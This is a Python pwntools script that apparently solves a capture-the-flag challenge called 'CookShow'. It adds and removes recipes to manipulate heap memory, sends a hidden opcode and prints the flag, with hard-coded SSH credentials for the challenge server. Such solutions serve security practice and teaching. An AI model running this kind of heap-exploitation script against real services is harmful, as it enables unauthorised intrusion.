from pwn import *

# size 1 = small
# size 2 = medium
def add_recepie(conn, size):
    log.info("[+] add receipe, size: %d", size)
    conn.sendline("1") # add receipt
    conn.sendline(str(size)) # size 
    conn.sendline("64") # num of bytes
    conn.sendline("AAAA") 

def rem_recepie(conn, size):
    log.info("[+] remove receipe, size: %d", size)
    conn.sendline("2") # remove receipt
    conn.sendline(str(size)) # size 

def print_recepie(conn, size):
    log.info("[+] log.info(receipe, size: %d", size)
    conn.sendline("3") 
    conn.sendline(str(size)) # size 

def secret_opcode(conn):
    conn.sendline("1337")
    log.info("[+] trigger")

def pwn(conn):
    add_recepie(conn, 1)
    add_recepie(conn, 2)
    rem_recepie(conn, 1)
    add_recepie(conn, 2)
    secret_opcode(conn)
    conn.recvuntil("I am salty, here:")
    conn.recvline()
    flag = conn.recvline()
    log.success(flag)
    
def pwn_local():
    conn = process(['./CookShow'])
    pwn(conn)

def pwn_remote():
    session = ssh("yeet", "ctf.kaf.sh", password="12345678", port=7030)
    conn = session.run("1")
    conn.read()
    pwn(conn)

if __name__ == '__main__':
    #pwn_local()
    pwn_remote()
